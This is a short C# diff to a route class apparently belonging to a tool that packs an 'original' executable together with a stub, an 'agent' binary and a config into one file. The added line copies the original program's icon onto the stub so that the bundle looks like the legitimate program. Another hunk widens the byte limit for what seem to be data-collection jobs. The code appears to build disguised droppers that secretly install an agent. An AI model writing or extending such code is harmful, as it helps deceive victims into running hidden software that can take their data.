@@ -264,7 +264,9 @@ public sealed class KliveLinkV2Routes
                 {
                     Profile = doc.RootElement.TryGetProperty("profile", out var p) ? p.GetString() ?? "t0-fast" : "t0-fast",
                     Tier = doc.RootElement.TryGetProperty("tier", out var tier) && Enum.TryParse(tier.GetString(), true, out V2CollectionTier parsed) ? parsed : V2CollectionTier.T0,
-                    MaxBytes = doc.RootElement.TryGetProperty("maxBytes", out var mb) ? mb.GetInt32() : 50 * 1024 * 1024,
+                    MaxBytes = doc.RootElement.TryGetProperty("maxBytes", out var mb) && mb.TryGetInt64(out long maxBytes)
+                        ? Math.Clamp(maxBytes, 1_000_000, 4L * 1024 * 1024 * 1024)
+                        : 50 * 1024 * 1024,
                     Categories = doc.RootElement.TryGetProperty("categories", out var cats) && cats.ValueKind == JsonValueKind.Array
                         ? cats.EnumerateArray().Select(c => c.GetString() ?? "").Where(c => c.Length > 0).ToArray()
                         : Array.Empty<string>(),
@@ -354,6 +356,7 @@ public sealed class KliveLinkV2Routes
                 byte[] stub = await File.ReadAllBytesAsync(stubPath);
                 byte[] agent = await File.ReadAllBytesAsync(agentPath);
                 byte[] config = await File.ReadAllBytesAsync(configPath);
+                stub = PeIconUpdater.ApplyOriginalIcon(original, stub);
                 using var memory = new MemoryStream(stub.Length + original.Length + agent.Length + config.Length + 512);
                 memory.Write(stub);
                 long originalOffset = memory.Position;
